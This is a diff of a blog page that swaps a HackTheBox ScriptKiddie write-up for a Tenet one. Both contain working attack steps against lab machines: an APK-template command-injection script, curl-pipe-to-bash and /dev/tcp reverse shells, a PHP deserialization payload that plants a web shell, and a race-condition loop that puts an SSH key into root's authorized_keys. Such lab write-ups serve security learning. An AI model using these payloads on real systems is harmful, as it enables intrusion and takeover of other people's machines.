@@ -33,10 +33,10 @@
   
     
   
-  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine ScriptKiddie, Which is an Easy Linux machine!" />
+  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine Tenet, Which is an Medium Linux machine!" />
 
   
-  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" />
+  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-tenet/" />
 
   
 
@@ -284,7 +284,7 @@
   <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
   <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
 
-  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" />
+  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-tenet/" />
 
   
   
@@ -299,18 +299,18 @@
   <meta property="twitter:card" content="summary_large_image" />
   
   <meta property="og:site_name" content="Mohamed ELLEUCH" />
-  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" />
-  <meta property="og:title" content="HackTheBox - ScriptKiddie Writeup | Mohamed ELLEUCH" />
-  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine ScriptKiddie, Which is an Easy Linux machine!" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/featured.png" />
-    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/featured.png" /><meta property="og:locale" content="en-us" />
+  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-tenet/" />
+  <meta property="og:title" content="HackTheBox - Tenet Writeup | Mohamed ELLEUCH" />
+  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine Tenet, Which is an Medium Linux machine!" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-tenet/featured.png" />
+    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-tenet/featured.png" /><meta property="og:locale" content="en-us" />
   
     
       <meta
         property="article:published_time"
-        content="2021-06-05T00:00:00&#43;00:00"
+        content="2021-06-12T00:00:00&#43;00:00"
       />
     
-    <meta property="article:modified_time" content="2021-06-05T00:00:00&#43;00:00">
+    <meta property="article:modified_time" content="2021-06-12T00:00:00&#43;00:00">
   
 
   
@@ -327,7 +327,7 @@
 
 
 
-  <title>HackTheBox - ScriptKiddie Writeup | Mohamed ELLEUCH</title>
+  <title>HackTheBox - Tenet Writeup | Mohamed ELLEUCH</title>
 </head>
 
 
@@ -619,10 +619,10 @@
 
 
 <div class="article-container pt-3">
-  <h1>HackTheBox - ScriptKiddie Writeup</h1>
+  <h1>HackTheBox - Tenet Writeup</h1>
 
   
-  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine ScriptKiddie, Which is an Easy Linux machine!</p>
+  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine Tenet, Which is an Medium Linux machine!</p>
   
 
   
@@ -649,7 +649,7 @@
     
       
     
-    Jun 5, 2021
+    Jun 12, 2021
   </span>
   
 
@@ -678,9 +678,9 @@
 </div>
 
 
-<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 596px; max-height: 365px;">
+<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 591px; max-height: 361px;">
   <div style="position: relative">
-    <img src="/writeups/htb-scriptkiddie/featured.png" alt="" class="featured-image">
+    <img src="/writeups/htb-tenet/featured.png" alt="" class="featured-image">
     <span class="article-header-caption">Image credit: [<strong>HackTheBox</strong>]</span>
   </div>
 </div>
@@ -693,105 +693,211 @@
       <h1 id="p-stylecolorredinformation-gathering-p"><p style="color:RED">Information Gathering </p></h1>
 <hr>
 <h2 id="p-stylecolorgreennmap-scan-p"><p style="color:Green">Nmap scan </p></h2>
-<pre><code class="language-bash">sudo nmap -sC -sV 10.10.10.226 -v
+<pre><code class="language-bash">sudo nmap -sC -sV 10.10.10.223 -v
 </code></pre>
-<pre><code class="language-bash">Discovered open port 22/tcp on 10.10.10.226
-Discovered open port 5000/tcp on 10.10.10.226
+<pre><code class="language-bash">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
+|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
+|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
+
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
 </code></pre>
-<img src="nmap.png">
 <p>We have two ports open</p>
 <ul>
-<li>22/SSH :  OpenSSH 8.2p1 Ubuntu 4ubuntu0.1</li>
-<li>5000/HTTP :  Werkzeug httpd 0.16.1</li>
+<li>
+<p>22/ssh :  OpenSSH 7.6p1</p>
+</li>
+<li>
+<p>80/http : Apache httpd 2.4.29</p>
+</li>
 </ul>
-<p>&ndash;&gt; Service versions seem to be up-to-date, we don&rsquo;t really focus on them</p>
-<h2 id="p-stylecolorgreenweb-server-p"><p style="color:Green">Web Server </p></h2>
-<img src="web.png">
-<p>&ndash;&gt; We have so many user inputs, first thing we should check if there is any command injections as it seem to be using linux binaries which can lead to RCE</p>
-<img src="web1.png">
-<img src="web2.png">
-<img src="web3.png">
-<p>&ndash;&gt; It seems that the input is hardcoded, taking into considerating that this is an easy box i don&rsquo;t that we should try to bypass these filters and just move on</p>
-<h1 id="p-stylecolorredfoothold--user-flag-p"><p style="color:RED">Foothold &amp; User flag </p></h1>
+<h2 id="p-stylecolorgreenweb-enum-p"><p style="color:Green">Web Enum </p></h2>
+<img src="apachedef.png">
+<p>Nothing interesting, let&rsquo;s try to add <code>tenet.htb</code> to our /etc/hosts</p>
+<img src="tenet1.png">
+<p>It&rsquo;s a wordpress page, after enumerating a bit we can find an interesting comment</p>
+<img src="comment.png">
+<ul>
+<li>
+<p>We first have a username &ldquo;neil&rdquo;</p>
+</li>
+<li>
+<p>A sator php file and it&rsquo;s backup has been deleted?</p>
+</li>
+</ul>
+<img src="sator404.png">
+<p>It didn&rsquo;t work in <code>tenet.htb</code></p>
+<p>Let&rsquo;s try on the main website</p>
+<img src="sator1.png">
+<p>The comment mentioned a backup file aswell</p>
+<p>let&rsquo;s make a small list for some backup extension to fuzz</p>
+<pre><code>backup
+bck
+old
+save
+bak
+sav
+copy
+old
+orig
+tmp
+txt
+back
+</code></pre>
+<pre><code class="language-bash">ffuf -c -w backup -u http://10.10.10.223/sator.php.FUZZ
+</code></pre>
+<img src="bak.png">
+<p>And there is a file named &ldquo;sator.php.bak&rdquo;</p>
+<p>And we get the source of the <code>sator.php</code> file</p>
 <hr>
-<p>Another interesting thing is the file upload that takes a msfvenom template!</p>
-<p>Searching a bit in google can lead us to what we want! We can craft a Android payload template and get a shell on the box</p>
+<h1 id="p-stylecolorredfoothold--p"><p style="color:RED">Foothold  </p></h1>
+<hr>
+<pre><code class="language-php">&lt;?php
+class DatabaseExport
+{
+	public $user_file = 'users.txt';
+	public $data = '';
+
+	public function update_db()
+	{
+		echo '[+] Grabbing users from text file &lt;br&gt;';
+		$this-&gt; data = 'Success';
+	}
+
+
+	public function __destruct()
+	{
+		file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);
+		echo '[] Database updated &lt;br&gt;';
+	//	echo 'Gotta get this working properly...';
+	}
+}
+
+$input = $_GET['arepo'] ?? '';
+$databaseupdate = unserialize($input);
+
+$app = new DatabaseExport;
+$app -&gt; update_db();
+?&gt;
+</code></pre>
+<p>&ndash;&gt; PHP Insecure Deserialization</p>
+<p>We can actually create a simple cmd shell</p>
+<p>This is the payload we can to serialize</p>
+<pre><code class="language-php">&lt;?php
+class DatabaseExport
+{
+	public $user_file = 'cmd.php';
+	public $data = '&lt;?php system($_GET[&quot;cmd&quot;])?&gt;';
+}
+
+$bad= new DatabaseExport;
+echo serialize($bad);
+?&gt;
+</code></pre>
+<p>running this php script will give us</p>
+<pre><code class="language-php">O:14:&quot;DatabaseExport&quot;:2:{s:9:&quot;user_file&quot;;s:7:&quot;cmd.php&quot;;s:4:&quot;data&quot;;s:28:&quot;&lt;?php system($_GET[&quot;cmd&quot;])?&gt;&quot;;}
+</code></pre>
+<p>our final payload</p>
+<pre><code class="language-url">http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22cmd.php%22%3Bs%3A4%3A%22data%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3F%3E%22%3B%7D
+</code></pre>
+<img src="arepo.png">
+<p>Seems like it worked! let&rsquo;s check if we have our cmd working</p>
+<img src="www.png">
+<p>And yes! we have code exec</p>
+<p>let&rsquo;s get a reverse shell on the machine</p>
+<pre><code class="language-url">http://10.10.10.223/cmd.php?cmd=curl%20http://10.10.14.105:8000/x|bash
+</code></pre>
 <blockquote>
-<p><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md</a></p>
+<p>x is just a reverse shell <a href="https://resh.vercel.app/">https://resh.vercel.app/</a></p>
 </blockquote>
-<p>Payload:</p>
-<pre><code class="language-python">#!/usr/bin/env python3
-import subprocess
-import tempfile
-import os
-from base64 import b32encode
+<img src="foothold.png">
+<hr>
+<h1 id="p-stylecolorreduser-flag--p"><p style="color:RED">User flag  </p></h1>
+<hr>
+<p>Let&rsquo;s check the <code>wp-config.php</code> for creds</p>
+<pre><code>
+/** MySQL database username */
+define( 'DB_USER', 'neil' );
 
-payload = 'curl http://10.10.14.54:1337/x|bash'
-
-
-payload_b32 = b32encode(payload.encode()).decode()
-dname = f&quot;CN='|echo {payload_b32} | base32 -d | sh #&quot;
-
-print(f&quot;[+] Manufacturing evil apkfile&quot;)
-print(f&quot;Payload: {payload}&quot;)
-print(f&quot;-dname: {dname}&quot;)
-print()
-
-tmpdir = tempfile.mkdtemp()
-apk_file = os.path.join(tmpdir, &quot;evil.apk&quot;)
-empty_file = os.path.join(tmpdir, &quot;empty&quot;)
-keystore_file = os.path.join(tmpdir, &quot;signing.keystore&quot;)
-storepass = keypass = &quot;password&quot;
-key_alias = &quot;signing.key&quot;
-
-# Touch empty_file
-open(empty_file, &quot;w&quot;).close()
-
-# Create apk_file
-subprocess.check_call([&quot;zip&quot;, &quot;-j&quot;, apk_file, empty_file])
-
-# Generate signing key with malicious -dname
-subprocess.check_call([&quot;keytool&quot;, &quot;-genkey&quot;, &quot;-keystore&quot;, keystore_file, &quot;-alias&quot;, key_alias, &quot;-storepass&quot;, storepass,
-                       &quot;-keypass&quot;, keypass, &quot;-keyalg&quot;, &quot;RSA&quot;, &quot;-keysize&quot;, &quot;2048&quot;, &quot;-dname&quot;, dname])
-
-# Sign APK using our malicious dname
-subprocess.check_call([&quot;jarsigner&quot;, &quot;-sigalg&quot;, &quot;SHA1withRSA&quot;, &quot;-digestalg&quot;, &quot;SHA1&quot;, &quot;-keystore&quot;, keystore_file,
-                       &quot;-storepass&quot;, storepass, &quot;-keypass&quot;, keypass, apk_file, key_alias])
-
-print()
-print(f&quot;[+] Done! apkfile is at {apk_file}&quot;)
-print(f&quot;Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&quot;)
+/** MySQL database password */
+define( 'DB_PASSWORD', 'Opera2112' );
 
 </code></pre>
-<p>Let&rsquo;s execute the apk file</p>
-<img src="apk.png">
-<img src="ff.png">
-And set a listener to get a reverse shell on the box
-<img src="rev1.png">
-<p>Let&rsquo;s stabilize our shell</p>
-<img src="stable.png">
-<h1 id="p-stylecolorred-2nd-user--root-flag-p"><p style="color:RED"> 2nd USER &amp; Root Flag </p></h1>
+<img src="user.png">
 <hr>
-<p>Looking a bit in the files, we can find an interesting file owned by pwn user!</p>
-<img src="pwn.png">
-<p>Basically it takes the ips from the hackers file and run nmap on it!</p>
-<p>The idea is to inject a malicious command instead of an ip</p>
-<pre><code class="language-bash">echo &quot;  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1' #&quot; &gt;&gt;hackers
-</code></pre>
-<blockquote>
-<p>We should add two spaces because of the | cut -d' ' -f3- |</p>
-</blockquote>
-<img src="we.png">
-<p>We got a shell as the user pwn!</p>
-<p>Let&rsquo;s check if he can run anything as root</p>
+<h1 id="p-stylecolorredroot-flag--p"><p style="color:RED">Root flag  </p></h1>
+<hr>
 <img src="sudo.png">
-<p>We can run msfconsole as root! basically a free win :D!</p>
-<pre><code class="language-bash">sudo /opt/metasploit-framework-6.0.9/msfconsole
+<p>neil can run <code>/usr/local/bin/enableSSH.sh</code> as root</p>
+<pre><code class="language-bash">#!/bin/bash
+
+checkAdded() {
+	sshName=$(/bin/echo $key | /usr/bin/cut -d &quot; &quot; -f 3)
+
+	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+
+		/bin/echo &quot;Successfully added $sshName to authorized_keys file!&quot;
+
+	else
+
+		/bin/echo &quot;Error in adding $sshName to authorized_keys file!&quot;
+
+	fi
+
+}
+checkFile() {
+
+	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+
+		/bin/echo &quot;Error in creating key file!&quot;
+
+		if [[ -f $1 ]]; then /bin/rm $1; fi
+
+		exit 1
+
+	fi
+
+}
+addKey() {
+
+	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+
+	(umask 110; touch $tmpName)
+
+	/bin/echo $key &gt;&gt;$tmpName
+
+	checkFile $tmpName
+
+	/bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+
+	/bin/rm $tmpName
+
+}
+key=&quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&quot;
+addKey
+checkAdded
+
 </code></pre>
+<p>What seems to be interesting is the <code>addKey</code> function which creates a temporary file with a random name then it puts the content of the <code>key</code> variable into it then the key is copied to the <code>authorized_keys</code> file</p>
+<p>What seems odd about this function is the <code>mktemp</code>  let&rsquo;s google about this function</p>
+<pre><code class="language-text">Caveats:
+In general, avoid using mktemp(), because a hostile process can exploit a race condition in the time between the generation of a temporary filename by mktemp() and the invoker's use of the temporary name. Use mkstemp() instead.
+</code></pre>
+<p>To sum up, mktemp is vulnerable to <code>race condition</code>  we&rsquo;ll take advantage of the time gap resulted when using this function!</p>
+<p>we&rsquo;ll inject our public ssh key into the temporary file created</p>
+<p>First we let the while loop run</p>
+<pre><code class="language-bash">while true; do echo &quot;ssh-rsa AAAAB3NzaC---SNIP---DgRk=&quot; | tee  /tmp/ssh-* ;done
+</code></pre>
+<p>then we execute the script</p>
+<p>and ssh into the box as root</p>
 <img src="root.png">
-<p>And we can execute commands as root</p>
-<img src="root1.png">
-<p>And we rooted the box!</p>
 <h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
 
     </div>
@@ -822,7 +928,7 @@ And set a listener to get a reverse shell on the box
       
       
       <li>
-        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/&amp;text=HackTheBox%20-%20ScriptKiddie%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
+        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-tenet/&amp;text=HackTheBox%20-%20Tenet%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
           <i class="fab fa-twitter"></i>
         </a>
       </li>
@@ -835,7 +941,7 @@ And set a listener to get a reverse shell on the box
       
       
       <li>
-        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/&amp;t=HackTheBox%20-%20ScriptKiddie%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
+        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-tenet/&amp;t=HackTheBox%20-%20Tenet%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
           <i class="fab fa-facebook"></i>
         </a>
       </li>
@@ -848,7 +954,7 @@ And set a listener to get a reverse shell on the box
       
       
       <li>
-        <a href="mailto:?subject=HackTheBox%20-%20ScriptKiddie%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" target="_blank" rel="noopener" class="share-btn-email">
+        <a href="mailto:?subject=HackTheBox%20-%20Tenet%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-tenet/" target="_blank" rel="noopener" class="share-btn-email">
           <i class="fas fa-envelope"></i>
         </a>
       </li>
@@ -861,7 +967,7 @@ And set a listener to get a reverse shell on the box
       
       
       <li>
-        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/&amp;title=HackTheBox%20-%20ScriptKiddie%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
+        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-tenet/&amp;title=HackTheBox%20-%20Tenet%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
           <i class="fab fa-linkedin-in"></i>
         </a>
       </li>
@@ -874,7 +980,7 @@ And set a listener to get a reverse shell on the box
       
       
       <li>
-        <a href="whatsapp://send?text=HackTheBox%20-%20ScriptKiddie%20Writeup%20https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+        <a href="whatsapp://send?text=HackTheBox%20-%20Tenet%20Writeup%20https://mohamed-elleuch.me/writeups/htb-tenet/" target="_blank" rel="noopener" class="share-btn-whatsapp">
           <i class="fab fa-whatsapp"></i>
         </a>
       </li>
@@ -887,7 +993,7 @@ And set a listener to get a reverse shell on the box
       
       
       <li>
-        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/&amp;title=HackTheBox%20-%20ScriptKiddie%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
+        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-tenet/&amp;title=HackTheBox%20-%20Tenet%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
           <i class="fab fa-weibo"></i>
         </a>
       </li>
